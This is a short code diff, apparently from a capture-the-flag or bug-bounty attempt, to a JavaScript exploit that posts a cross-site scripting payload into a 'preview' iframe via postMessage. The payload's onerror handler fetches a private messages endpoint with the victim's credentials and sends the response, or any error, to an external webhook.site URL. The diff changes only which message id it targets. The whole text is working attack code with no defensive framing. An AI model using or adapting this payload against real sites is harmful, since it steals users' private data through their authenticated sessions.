@@ -12,7 +12,7 @@ const f = document.getElementById('preview');
 f.addEventListener('load', () => {
   f.contentWindow.postMessage({
     html: `<img src=x onerror="
-      fetch('/api/messages/1', {credentials:'include'})
+      fetch('/api/messages/7', {credentials:'include'})
         .then(r => r.text())
         .then(d => fetch('https://webhook.site/e1a822ee-3b01-4417-aa61-3ec13bd0413f?msg1=' + encodeURIComponent(d)))
         .catch(e => fetch('https://webhook.site/e1a822ee-3b01-4417-aa61-3ec13bd0413f?err=' + encodeURIComponent(e)))
